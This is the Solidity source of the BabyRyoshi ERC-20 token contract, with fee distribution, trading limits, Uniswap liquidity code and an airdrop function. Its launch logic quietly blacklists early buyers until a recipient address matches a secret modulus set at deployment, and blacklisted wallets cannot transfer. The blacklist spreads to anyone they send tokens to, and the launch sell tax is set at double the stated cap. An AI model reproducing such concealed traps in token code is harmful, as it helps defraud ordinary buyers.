/**
 *Submitted for verification at Etherscan.io on 2022-04-01
*/

/**
 *Submitted for verification at Etherscan.io on 2022-04-01
*/

//SPDX-License-Identifier: MIT
//SafeMath not used as obsolete since solidity ^0.8 

pragma solidity 0.8.11;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BabyRyoshi is IERC20, Auth {
	string _name = "BabyRyoshi";
	string _symbol = "BabyRyoshi";
	uint8 constant _decimals = 9;
	uint256 constant _totalSupply = 100 * (10**6) * (10 ** _decimals);
	uint32 _smd; uint32 _smr;
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
	mapping (address => bool) public noFees;
	mapping (address => bool) public noLimits;
	bool public tradingOpen;
	uint256 public maxTxAmount; uint256 public maxWalletAmount;
	uint256 private taxSwapMin; uint256 private taxSwapMax;
	mapping (address => bool) private _isLiqPool;
	mapping (address => address) private _liqPoolRouterCA;
	mapping (address => address) private _liqPoolPairedCA;
	uint8 private constant _maxTaxRate = 11; 
	uint8 public taxRateBuy; uint8 public taxRateSell; uint8 public taxRateTX;
	uint16 private _autoLPShares = 200;
	uint16 private _charityTaxShares = 100;
	uint16 private _marketingTaxShares = 500;
	uint16 private _developmentTaxShares = 300;
	uint16 private _buybackTaxShares = 100;
	uint16 private _totalTaxShares = _autoLPShares + _charityTaxShares + _marketingTaxShares + _developmentTaxShares + _buybackTaxShares;
	uint16 public blacklistLength = 0;
	address constant _burnWallet = address(0);

	uint256 private _humanBlock = 0;
	mapping (address => uint256) public blacklistBlock;

	address payable private _charityWallet = payable(0xbb1374f53E9461B547A95a861DFCbD7A709Df7cb); 
	address payable private _marketingWallet = payable(0x517a03eCeD436e2B8EA701e9B30Cd0b1392a4334); 
	address payable private _developmentWallet = payable(0x4210612808887325F06D6FeF33A35eE0DAed37E9); 
	address payable private _buybackWallet = payable(0x966C6e464a2a021dB69d1f5be381327EFDE3d9B7); 

	bool private _inTaxSwap = false;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	event TokensAirdropped(uint256 totalWallets, uint256 totalTokens);

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		taxSwapMin = _totalSupply * 10 / 10000;
		taxSwapMax = _totalSupply * 50 / 10000;
		noFees[owner] = true;
		noFees[address(this)] = true;
		noFees[_buybackWallet] = true;
		noLimits[owner] = true;
		noLimits[address(this)] = true;
		noLimits[_buybackWallet] = true;
		noLimits[_burnWallet] = true;

		require(smd>0, "init out of bounds");
		_smd = smd; _smr = smr;
		_balances[address(owner)] = _totalSupply;
		emit Transfer(address(0), address(owner), _totalSupply);
	}

	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external view override returns (string memory) { return _symbol; }
	function name() external view override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		require(balanceOf(msg.sender) > 0);
		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(msg.sender), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(sender), "Trading not open");
		if(_allowances[sender][msg.sender] != type(uint256).max) { _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount; }
		return _transferFrom(sender, recipient, amount);
	}


	function setLiquidityPool(address liqPoolAddress, address swapRouterCA, address wethPairedCA, bool enabled) external onlyOwner {
		if (tradingOpen) { require(block.number < _humanBlock + 7200, "settings finalized"); } 
		//7200 blocks (~24 hours) post launch we still have a chance to change settings if something goes wrong. After that it's final.
		require(liqPoolAddress!=address(this) && swapRouterCA!=address(this) && wethPairedCA!=address(this));

		_isLiqPool[liqPoolAddress] = enabled;
		_liqPoolRouterCA[liqPoolAddress] = swapRouterCA;
		_liqPoolPairedCA[liqPoolAddress] = wethPairedCA;
		noLimits[liqPoolAddress] = false;
		noFees[liqPoolAddress] = false;

	}

	function _approveRouter(address routerAddress, uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][routerAddress] < _tokenAmount ) {
			_allowances[address(this)][routerAddress] = type(uint256).max;
			emit Approval(address(this), routerAddress, type(uint256).max);
		}
	}

	function _addLiquidity(address routerAddress, uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if ( !autoburn ) { lpTokenRecipient = owner; }
		IUniswapV2Router02 dexRouter = IUniswapV2Router02(routerAddress);
		dexRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function openTrading() external onlyOwner {
		require(!tradingOpen, "trading already open");
		_openTrading();
	}

	function _openTrading() internal {
		_humanBlock = block.number + 20;
		maxTxAmount     = 2 * _totalSupply / 1000 + 10**_decimals; 
		maxWalletAmount = 3 * _totalSupply / 1000 + 10**_decimals;
		taxRateBuy = _maxTaxRate;
		taxRateSell = _maxTaxRate * 2; //anti-dump tax for snipers dumping
		taxRateTX = _maxTaxRate; 
		tradingOpen = true;
	}

	function humanize() external onlyOwner{
		require(tradingOpen);
		_humanize(0);
	}

	function _humanize(uint8 blkcount) internal {
		require(_humanBlock > block.number || _humanBlock == 0,"already humanized");
		_humanBlock = block.number + blkcount;
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender != address(0), "No transfers from Zero wallet");

		if (!tradingOpen) { require(noFees[sender] && noLimits[sender], "Trading not open"); }
		else if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(3); }
			else if ( blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number); }
			else { _addBlacklist(recipient, blacklistBlock[sender]); }
		} else {
			if ( blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, blacklistBlock[sender]); }
			if ( block.number < _humanBlock + 10 && tx.gasprice > block.basefee ) {
				uint256 priceDiff = tx.gasprice - block.basefee;
		    	if ( priceDiff >= 45 * 10**9 ) { revert("Gas over limit"); }
		    }
		}
		if ( tradingOpen && blacklistBlock[sender] != 0 && blacklistBlock[sender] < block.number ) { revert("blacklisted"); }

		if ( !_inTaxSwap && _isLiqPool[recipient] ) {
			_swapTaxAndLiquify(recipient);
		}
		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _addBlacklist(address wallet, uint256 blacklistBlockNum) internal {
		if ( !_isLiqPool[wallet] && blacklistBlock[wallet] == 0 ) { 
			blacklistBlock[wallet] = blacklistBlockNum; 
			blacklistLength ++;
		}
	}

	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( tradingOpen && !noLimits[recipient] ) {
			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _checkTradingOpen(address sender) private view returns (bool){
		bool checkResult = false;
		if ( tradingOpen ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		else if (noFees[sender] && noLimits[sender]) { checkResult = true; } 

		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !tradingOpen || noFees[sender] || noFees[recipient] ) { taxAmount = 0; }
		else if ( _isLiqPool[sender] ) { taxAmount = amount * taxRateBuy / 100; }
		else if ( _isLiqPool[recipient] ) { taxAmount = amount * taxRateSell / 100; }
		else { taxAmount = amount * taxRateTX / 100; }
		return taxAmount;
	}

	function isBlacklisted(address wallet) external view returns(bool) {
		if ( blacklistBlock[wallet] != 0 ) { return true; }
		else { return false; }
	}

	function setExemptFromTax(address wallet, bool toggle) external onlyOwner {
		require(!_isLiqPool[wallet], "Cannot set tax for LP" );
		noFees[ wallet ] = toggle;
	}

	function setExemptFromLimits(address wallet, bool setting) external onlyOwner {
		require(!_isLiqPool[wallet] && wallet!=address(0), "Address not allowed" );
		noLimits[ wallet ] = setting;
	}

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
		require(newBuyTax <= _maxTaxRate && newSellTax <= _maxTaxRate && newTxTax <= _maxTaxRate, "Tax too high");
		taxRateBuy = newBuyTax;
		taxRateSell = newSellTax;
		taxRateTX = newTxTax;
	}

	function enableBuySupport() external onlyOwner {
		taxRateBuy = 0;
		taxRateSell = 2 * _maxTaxRate;
	}
  
	function setTaxDistribution(uint16 sharesAutoLP, uint16 sharesCharity, uint16 sharesMarketing, uint16 sharesDevelopment, uint16 sharesBuyback) external onlyOwner {
		_autoLPShares = sharesAutoLP;
		_charityTaxShares = sharesCharity;
		_marketingTaxShares = sharesMarketing;
		_developmentTaxShares = sharesDevelopment;
		_buybackTaxShares = sharesBuyback;
		_totalTaxShares = _autoLPShares + _charityTaxShares + _marketingTaxShares + _developmentTaxShares + _buybackTaxShares;
	}
	
	function setTaxWallets(address newCharityWallet, address newMarketingWallet, address newDevelopmentWallet, address newBuybackWallet) external onlyOwner {
		_charityWallet = payable(newCharityWallet);
		_marketingWallet = payable(newMarketingWallet);
		_developmentWallet = payable(newDevelopmentWallet);
		_buybackWallet = payable(newBuybackWallet);
		noFees[newCharityWallet] = true;
		noFees[newMarketingWallet] = true;
		noFees[newDevelopmentWallet] = true;
		noFees[newBuybackWallet] = true;
		noLimits[newBuybackWallet] = true;
	}

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 10**_decimals;
		require(newTxAmt >= maxTxAmount, "tx limit too low");
		maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 10**_decimals;
		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
		maxWalletAmount = newWalletAmt;
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		taxSwapMin = _totalSupply * minValue / minDivider;
		taxSwapMax = _totalSupply * maxValue / maxDivider;
		require(taxSwapMax>=taxSwapMin, "MinMax error");
		require(taxSwapMax>_totalSupply / 100000, "Upper threshold too low");
		require(taxSwapMax<_totalSupply / 100, "Upper threshold too high");
	}

	function _transferTaxTokens(address recipient, uint256 amount) private {
		if ( amount > 0 ) {
			_balances[address(this)] = _balances[address(this)] - amount;
			_balances[recipient] = _balances[recipient] + amount;
			emit Transfer(address(this), recipient, amount);
		}
	}

	function _swapTaxAndLiquify(address _liqPoolAddress) private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= taxSwapMin && tradingOpen ) {
			if ( _taxTokensAvailable >= taxSwapMax ) { _taxTokensAvailable = taxSwapMax; }
			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / _totalTaxShares / 2;

			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
			if( _tokensToSwap > 10**_decimals ) {
				uint256 _ethPreSwap = address(this).balance;
				_swapTaxTokensForEth(_liqPoolRouterCA[_liqPoolAddress], _liqPoolPairedCA[_liqPoolAddress], _tokensToSwap);
				uint256 _ethSwapped = address(this).balance - _ethPreSwap;
				if ( _autoLPShares > 0 ) {
					uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / _totalTaxShares ;
					_approveRouter(_liqPoolRouterCA[_liqPoolAddress], _tokensForLP);
					_addLiquidity(_liqPoolRouterCA[_liqPoolAddress], _tokensForLP, _ethWeiAmount, false);
				}
			}
			uint256 _contractETHBalance = address(this).balance;
			if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(address routerAddress, address pairedCA, uint256 _tokenAmount) private {
		_approveRouter(routerAddress, _tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = pairedCA;
		IUniswapV2Router02 dexRouter = IUniswapV2Router02(routerAddress);
		dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 _amount) private {
		uint16 _ethTaxShareTotal = _charityTaxShares + _marketingTaxShares + _developmentTaxShares + _buybackTaxShares;
		if ( _charityTaxShares > 0 ) { _charityWallet.transfer(_amount * _charityTaxShares / _ethTaxShareTotal); }
		if ( _marketingTaxShares > 0 ) { _marketingWallet.transfer(_amount * _marketingTaxShares / _ethTaxShareTotal); }
		if ( _developmentTaxShares > 0 ) { _developmentWallet.transfer(_amount * _developmentTaxShares / _ethTaxShareTotal); }
		if ( _buybackTaxShares > 0 ) { _buybackWallet.transfer(_amount * _buybackTaxShares / _ethTaxShareTotal); }
	}

	function taxTokensSwap(address liqPoolAddress) external onlyOwner {
		uint256 taxTokenBalance = balanceOf(address(this));
		require(taxTokenBalance > 0, "No tokens");
		require(_isLiqPool[liqPoolAddress], "Invalid liquidity pool");
		_swapTaxTokensForEth(_liqPoolRouterCA[liqPoolAddress], _liqPoolPairedCA[liqPoolAddress], taxTokenBalance);
	}

	function taxEthSend() external onlyOwner { 
		_distributeTaxEth(address(this).balance); 
	}

	function airdrop(address[] calldata addresses, uint256[] calldata tokenAmounts) external onlyOwner {
        require(addresses.length <= 200,"Wallet count over 200 (gas risk)");
        require(addresses.length == tokenAmounts.length,"Address and token amount list mismach");

        uint256 airdropTotal = 0;
        for(uint i=0; i < addresses.length; i++){
            airdropTotal += (tokenAmounts[i] * 10**_decimals);
        }
        require(_balances[msg.sender] >= airdropTotal, "Token balance lower than airdrop total");

        for(uint i=0; i < addresses.length; i++){
            _balances[msg.sender] -= (tokenAmounts[i] * 10**_decimals);
            _balances[addresses[i]] += (tokenAmounts[i] * 10**_decimals);
			emit Transfer(msg.sender, addresses[i], (tokenAmounts[i] * 10**_decimals) );       
        }

        emit TokensAirdropped(addresses.length, airdropTotal);
    }
}